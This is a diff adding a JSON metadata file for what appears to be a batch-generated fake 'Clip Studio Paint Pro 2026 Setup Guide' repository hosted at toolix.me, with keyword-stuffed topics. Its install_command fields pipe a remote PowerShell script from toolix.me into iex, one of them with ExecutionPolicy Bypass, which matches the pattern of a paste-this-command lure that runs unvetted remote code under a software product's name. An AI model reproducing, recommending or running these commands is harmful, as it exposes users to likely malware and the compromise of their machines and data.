@@ -1,0 +1,28 @@
+{
+  "repo": "Clip-Studio-Paint-Pro-2026-Setup-Guide",
+  "product": "Clip Studio Paint Pro 2026 Setup Guide",
+  "product_title": "Clip Studio Paint Pro 2026 Setup Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-clip-paint-pro-guide",
+    "clip-paint-pro-guide-app",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "creative-workflow",
+    "clip-paint-pro-guide-creative-tool",
+    "clip-paint-pro-guide-design-tool",
+    "clip-paint-pro-guide",
+    "clip-paint-pro-guide-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
